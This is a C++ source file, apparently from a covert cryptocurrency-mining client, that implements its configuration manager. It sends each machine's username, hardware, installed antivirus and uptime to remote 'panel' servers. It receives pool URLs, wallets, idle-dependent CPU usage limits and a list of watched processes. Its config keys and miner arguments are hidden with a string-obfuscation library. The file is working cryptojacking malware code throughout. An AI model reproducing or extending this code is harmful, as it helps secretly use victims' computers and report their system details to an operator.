#include "../include/config_manager.h"
#include "../include/http_client.h"
#include "../include/util.h"
#include "../include/encryption.h"
#ifdef ENABLE_EMBEDDED_CONFIG
#include "embedded_config_generated.h"
#endif
#include <iostream>
#include <ctime>
#include <sstream>
#include <vector>
#include <thread>
#include <chrono>

#include "../Obfusk8/Instrumentation/materialization/state/Obfusk8Core.hpp"

bool ConfigManager::FetchConfigFromPanelWithFallback(const std::string& panelUrls,
                                                     const std::string& pcUsername,
                                                     const std::string& deviceHash,
                                                     const std::string& cpuName,
                                                     const std::string& gpuName,
                                                     const std::string& antivirusName,
                                                     const std::string& clientVersion,
                                                     double cpuHashrate,
                                                     double gpuHashrate,
                                                     int deviceUptimeMin) {
    // Split URLs by comma
    std::vector<std::string> urls;
    std::stringstream ss(panelUrls);
    std::string url;
    
    while (std::getline(ss, url, ',')) {
        // Trim whitespace
        size_t start = url.find_first_not_of(" \t\r\n");
        size_t end = url.find_last_not_of(" \t\r\n");
        if (start != std::string::npos && end != std::string::npos) {
            urls.push_back(url.substr(start, end - start + 1));
        }
    }
    
    if (urls.empty()) {
        std::cerr << "[-] No valid panel URLs provided" << std::endl;
        return false;
    }
    
#ifdef ENABLE_DEBUG_CONSOLE
    std::cout << "[*] Trying " << urls.size() << " panel URL(s) with fallback support" << std::endl;
#endif
    
    // Try each URL in sequence. Every URL gets MAX_RECONNECT_ATTEMPTS tries
    // before the client moves on to the next (backup) URL, and only once every
    // URL is exhausted does it fall back to the internal (embedded) config.
    const int MAX_RECONNECT_ATTEMPTS = 3;
    const int RECONNECT_DELAY_SECONDS = 3;

    for (size_t i = 0; i < urls.size(); i++) {
        std::wstring wurl(urls[i].begin(), urls[i].end());

        for (int attempt = 1; attempt <= MAX_RECONNECT_ATTEMPTS; attempt++) {
#ifdef ENABLE_DEBUG_CONSOLE
            std::cout << "[*] Attempting connection to panel " << (i + 1) << "/" << urls.size()
                      << ": " << urls[i] << " (attempt " << attempt << "/" << MAX_RECONNECT_ATTEMPTS << ")" << std::endl;
#endif

            if (FetchConfigFromPanel(wurl, pcUsername, deviceHash, cpuName, gpuName, antivirusName, clientVersion, cpuHashrate, gpuHashrate, deviceUptimeMin)) {
#ifdef ENABLE_DEBUG_CONSOLE
                std::cout << "[+] Successfully connected to panel: " << urls[i] << std::endl;
#endif
                m_lastFetchFromPanel = true;
                return true;
            }

            // Reconnect before giving up on this URL
            if (attempt < MAX_RECONNECT_ATTEMPTS) {
#ifdef ENABLE_DEBUG_CONSOLE
                std::cout << "[-] Attempt " << attempt << "/" << MAX_RECONNECT_ATTEMPTS << " failed, reconnecting in "
                          << RECONNECT_DELAY_SECONDS << "s..." << std::endl;
#endif
                std::this_thread::sleep_for(std::chrono::seconds(RECONNECT_DELAY_SECONDS));
            }
        }

        // Only after MAX_RECONNECT_ATTEMPTS failed reconnects: next (backup) URL
#ifdef ENABLE_DEBUG_CONSOLE
        if (i + 1 < urls.size()) {
            std::cout << "[-] " << MAX_RECONNECT_ATTEMPTS << " attempts failed, switching to backup URL..." << std::endl;
        }
#endif
    }

    std::cerr << "[-] All panel URLs failed (" << MAX_RECONNECT_ATTEMPTS << " attempts each)" << std::endl;
    
    // Try embedded config as fallback
    if (LoadEmbeddedConfig()) {
        m_lastFetchFromPanel = false;
        return true;
    }
    
    return false;
}

bool ConfigManager::FetchConfigFromUrlWithFallback(const std::string& configUrls) {
    // Split URLs by comma
    std::vector<std::string> urls;
    std::stringstream ss(configUrls);
    std::string url;
    
    while (std::getline(ss, url, ',')) {
        // Trim whitespace
        size_t start = url.find_first_not_of(" \t\r\n");
        size_t end = url.find_last_not_of(" \t\r\n");
        if (start != std::string::npos && end != std::string::npos) {
            urls.push_back(url.substr(start, end - start + 1));
        }
    }
    
    if (urls.empty()) {
        std::cerr << "[-] No valid config URLs provided" << std::endl;
        return false;
    }
    
#ifdef ENABLE_DEBUG_CONSOLE
    std::cout << "[*] Trying " << urls.size() << " config URL(s) with fallback support" << std::endl;
#endif
    
    // Same reconnect policy as the POST path: MAX_RECONNECT_ATTEMPTS per URL
    // before switching to the backup URL, embedded config only after all URLs fail.
    const int MAX_RECONNECT_ATTEMPTS = 3;
    const int RECONNECT_DELAY_SECONDS = 3;

    for (size_t i = 0; i < urls.size(); i++) {
        std::wstring wurl(urls[i].begin(), urls[i].end());

        for (int attempt = 1; attempt <= MAX_RECONNECT_ATTEMPTS; attempt++) {
#ifdef ENABLE_DEBUG_CONSOLE
            std::cout << "[*] Attempting GET request to config URL " << (i + 1) << "/" << urls.size()
                      << ": " << urls[i] << " (attempt " << attempt << "/" << MAX_RECONNECT_ATTEMPTS << ")" << std::endl;
#endif

            if (FetchConfigFromUrlDirect(wurl)) {
#ifdef ENABLE_DEBUG_CONSOLE
                std::cout << "[+] Successfully fetched config from: " << urls[i] << std::endl;
#endif
                m_lastFetchFromPanel = true;
                return true;
            }

            // Reconnect before giving up on this URL
            if (attempt < MAX_RECONNECT_ATTEMPTS) {
#ifdef ENABLE_DEBUG_CONSOLE
                std::cout << "[-] Attempt " << attempt << "/" << MAX_RECONNECT_ATTEMPTS << " failed, reconnecting in "
                          << RECONNECT_DELAY_SECONDS << "s..." << std::endl;
#endif
                std::this_thread::sleep_for(std::chrono::seconds(RECONNECT_DELAY_SECONDS));
            }
        }

        // Only after MAX_RECONNECT_ATTEMPTS failed reconnects: next (backup) URL
#ifdef ENABLE_DEBUG_CONSOLE
        if (i + 1 < urls.size()) {
            std::cout << "[-] " << MAX_RECONNECT_ATTEMPTS << " attempts failed, switching to backup URL..." << std::endl;
        }
#endif
    }

    std::cerr << "[-] All config URLs failed (" << MAX_RECONNECT_ATTEMPTS << " attempts each)" << std::endl;
    
    // Try embedded config as fallback
    if (LoadEmbeddedConfig()) {
        m_lastFetchFromPanel = false;
        return true;
    }
    
    return false;
}

bool ConfigManager::FetchConfigFromUrlDirect(const std::wstring& configUrl) {
    try {
#ifdef ENABLE_DEBUG_CONSOLE
        std::cout << "[*] Fetching configuration directly from URL..." << std::endl;
#endif
        
        // Fetch JSON directly from URL without sending any system info
        std::string response = fetchJsonFromUrl(configUrl);
        
        if (response.empty()) {
            std::cerr << "[-] Failed to get response from config URL" << std::endl;
            return false;
        }

#ifdef ENABLE_DEBUG_CONSOLE
        std::cout << "[+] Config response: " << response << std::endl;
#endif

        // Parse response
        json jsonResponse = json::parse(response);
        ParseConfigFromJson(jsonResponse);

        return true;
    }
    catch (const json::exception& e) {
        std::cerr << "[-] JSON error: " << e.what() << std::endl;
        return false;
    }
    catch (const std::exception& e) {
        std::cerr << "[-] Error: " << e.what() << std::endl;
        return false;
    }
}

bool ConfigManager::FetchConfigFromPanel(const std::wstring& panelUrl,
                                         const std::string& pcUsername,
                                         const std::string& deviceHash,
                                         const std::string& cpuName,
                                         const std::string& gpuName,
                                         const std::string& antivirusName,
                                         const std::string& clientVersion,
                                         double cpuHashrate,
                                         double gpuHashrate,
                                         int deviceUptimeMin) {
    try {
        // Guard rail: nlohmann::json::dump() throws type_error.316 on invalid
        // UTF-8 and would abort the whole report, so make sure every string that
        // originates from the OS is valid UTF-8 before it is serialised.
        const std::string safeUsername = EnsureValidUTF8(pcUsername);
        const std::string safeCpuName  = EnsureValidUTF8(cpuName);
        const std::string safeGpuName  = EnsureValidUTF8(gpuName);
        const std::string safeAvName   = EnsureValidUTF8(antivirusName);
        const std::string safeVersion  = EnsureValidUTF8(clientVersion);

        if (safeUsername != pcUsername || safeCpuName != cpuName ||
            safeGpuName != gpuName || safeAvName != antivirusName) {
            std::cerr << "[-] Warning: non UTF-8 system info sanitised before reporting" << std::endl;
        }

        // Build miner report JSON
        json minerReport = {
            {OBFUSCATE_STRING("pc_username"),      safeUsername},
            {OBFUSCATE_STRING("device_hash"),      EnsureValidUTF8(deviceHash)},
            {OBFUSCATE_STRING("cpu_name"),         safeCpuName},
            {OBFUSCATE_STRING("gpu_name"),         safeGpuName},
            {OBFUSCATE_STRING("cpu_hashrate"),     cpuHashrate},
            {OBFUSCATE_STRING("gpu_hashrate"),     gpuHashrate},
            {OBFUSCATE_STRING("antivirus_name"),   safeAvName},
            {OBFUSCATE_STRING("device_uptime_min"),deviceUptimeMin},
            {OBFUSCATE_STRING("client_version"),   safeVersion},
            {OBFUSCATE_STRING("timestamp"),        std::time(nullptr)}
        };

        std::string jsonPayload = minerReport.dump();
        std::cout << "[*] Sending miner report to panel: " << jsonPayload << std::endl;

        // Post to panel
        std::string response = postJsonToUrl(panelUrl, jsonPayload);
        
        if (response.empty()) {
            std::cerr << "[-] Failed to get response from panel" << std::endl;
            return false;
        }

        std::cout << "[+] Panel response: " << response << std::endl;

        // Parse response
        json jsonResponse = json::parse(response);
        ParseConfigFromJson(jsonResponse);

        return true;
    }
    catch (const json::exception& e) {
        std::cerr << "[-] JSON error: " << e.what() << std::endl;
        return false;
    }
    catch (const std::exception& e) {
        std::cerr << "[-] Error: " << e.what() << std::endl;
        return false;
    }
}

void ConfigManager::ParseConfigFromJson(const json& jsonResponse) {
    try {
        if (jsonResponse.contains(OBFUSCATE_STRING("cpu_config")) && !jsonResponse[OBFUSCATE_STRING("cpu_config")].is_null()) {
            json cpuJson = jsonResponse[OBFUSCATE_STRING("cpu_config")];
            cpuConfig.mining_url     = cpuJson.value(OBFUSCATE_STRING("mining_url"),     "");
            cpuConfig.wallet         = cpuJson.value(OBFUSCATE_STRING("wallet"),         "");
            cpuConfig.password       = cpuJson.value(OBFUSCATE_STRING("password"),       "");
            cpuConfig.non_idle_usage = cpuJson.value(OBFUSCATE_STRING("non_idle_usage"),  50.0);
            cpuConfig.idle_usage     = cpuJson.value(OBFUSCATE_STRING("idle_usage"),     100.0);
            cpuConfig.wait_time_idle = cpuJson.value(OBFUSCATE_STRING("wait_time_idle"),    3);
            cpuConfig.use_ssl        = cpuJson.value(OBFUSCATE_STRING("use_ssl"),         0);
        }

        if (jsonResponse.contains(OBFUSCATE_STRING("enable_cpu"))) {
            cpuConfig.enabled = jsonResponse.value(OBFUSCATE_STRING("enable_cpu"), 1);
        } else {
            cpuConfig.enabled = 1;
        }

        if (jsonResponse.contains(OBFUSCATE_STRING("gpu_config")) && !jsonResponse[OBFUSCATE_STRING("gpu_config")].is_null()) {
            json gpuJson = jsonResponse[OBFUSCATE_STRING("gpu_config")];
            gpuConfig.mining_url     = gpuJson.value(OBFUSCATE_STRING("mining_url"),  "");
            gpuConfig.wallet         = gpuJson.value(OBFUSCATE_STRING("wallet"),      "");
            gpuConfig.password       = gpuJson.value(OBFUSCATE_STRING("password"),    "");
            gpuConfig.worker         = gpuJson.value(OBFUSCATE_STRING("worker"),      OBFUSCATE_STRING("test"));
            gpuConfig.algo           = gpuJson.value(OBFUSCATE_STRING("algo"),        OBFUSCATE_STRING("kawpow"));
            gpuConfig.fan_speed      = gpuJson.value(OBFUSCATE_STRING("fan_speed"),   0);
            gpuConfig.wait_time_idle = gpuJson.value(OBFUSCATE_STRING("wait_time_idle"),   3);
            gpuConfig.use_ssl        = gpuJson.value(OBFUSCATE_STRING("use_ssl"),     0);
        }

        if (jsonResponse.contains(OBFUSCATE_STRING("enable_gpu"))) {
            gpuConfig.enabled = jsonResponse.value(OBFUSCATE_STRING("enable_gpu"), 1);
        } else {
            gpuConfig.enabled = 1;
        }

        donateConfigs.clear();
        const std::string donateKey = OBFUSCATE_STRING("donate_config");
        if (jsonResponse.contains(donateKey) && jsonResponse[donateKey].is_object()) {
            for (const auto& item : jsonResponse[donateKey].items()) {
                std::string algo = item.key();
                json dj = item.value();
                if (!dj.is_object()) continue;
                MinerConfig dc;
                dc.algo       = algo;
                dc.mining_url = dj.value(OBFUSCATE_STRING("mining_url"), "");
                dc.wallet     = dj.value(OBFUSCATE_STRING("wallet"),     "");
                dc.password   = dj.value(OBFUSCATE_STRING("password"),   "");
                dc.worker     = dj.value(OBFUSCATE_STRING("worker"),     "");
                dc.enabled    = 1;
                donateConfigs[algo] = dc;
            }
        }

        watchedProcesses.clear();
        if (jsonResponse.contains(OBFUSCATE_STRING("watched_processes")) && jsonResponse[OBFUSCATE_STRING("watched_processes")].is_array()) {
            for (const auto& proc : jsonResponse[OBFUSCATE_STRING("watched_processes")]) {
                if (proc.is_string()) {
                    std::string name = proc.get<std::string>();
                    if (!name.empty()) watchedProcesses.push_back(name);
                }
            }
        }

        std::cout << "[+] Configuration loaded successfully" << std::endl;
        std::cout << "    CPU Mining URL: " << cpuConfig.mining_url << " (SSL: " << cpuConfig.use_ssl << ", Enabled: " << cpuConfig.enabled << ")" << std::endl;
        std::cout << "    GPU Mining URL: " << gpuConfig.mining_url << " (SSL: " << gpuConfig.use_ssl << ", Enabled: " << gpuConfig.enabled << ")" << std::endl;
    }
    catch (const std::exception& e) {
        std::cerr << "[-] Error parsing config: " << e.what() << std::endl;
    }
}

bool ConfigManager::GetDonateConfig(const std::string& algo, MinerConfig& out) const {
    auto it = donateConfigs.find(algo);
    if (it == donateConfigs.end()) return false;
    out = it->second;
    return true;
}

bool ConfigManager::LoadEmbeddedConfig() {
#ifdef ENABLE_EMBEDDED_CONFIG
    // Load built-in fallback configuration from embedded generated JSON string
    try {
        // Use the generated JSON string constant
        std::string configJson = EMBEDDED_CONFIG_JSON;
        
        // Parse JSON
        json embeddedConfig = json::parse(configJson);
        
        // Use the same parsing logic
        ParseConfigFromJson(embeddedConfig);
        std::cout << "[*] Using embedded fallback configuration" << std::endl;
        return true;
    }
    catch (const std::exception& e) {
        std::cerr << "[-] Error loading embedded config: " << e.what() << std::endl;
        return false;
    }
#else
    std::cerr << "[-] Embedded config not enabled at compile time" << std::endl;
    return false;
#endif
}

std::string ConfigManager::BuildCommandLineArgs(const MinerConfig& config, bool isIdle) {
    if (config.mining_url.empty() || config.wallet.empty()) {
        return "";
    }

    std::string args = OBFUSCATE_STRING("--donate-level 3 -o ");
    args += config.mining_url + " ";
    args += OBFUSCATE_STRING("-u ");
    args += config.wallet + " ";
    
    // Handle password: use Windows username if set to {USER}
    std::string password = config.password;
    if (password == "{USER}") {
        password = GetWindowsUsername();
    }
    
    if (!password.empty()) {
        args += OBFUSCATE_STRING("-p ");
        args += password + " ";
    }
    
    // Add TLS flag if use_ssl is enabled or if indicated in password field
    if (config.use_ssl == 1 || config.password.find("--tls") != std::string::npos) {
        args += OBFUSCATE_STRING("--tls ");
    }
    
    // Add performance settings based on idle state
    // --cpu-max-threads-hint accepts percentage values (0-100+)
    double usagePercent = isIdle ? config.idle_usage : config.non_idle_usage;
    if (usagePercent >= 0) {
        int hint = static_cast<int>(usagePercent);
        args += OBFUSCATE_STRING("--cpu-max-threads-hint=");
        args += std::to_string(hint) + " ";
    }
    
    args += OBFUSCATE_STRING("-a rx/0");
    
    return args;
}
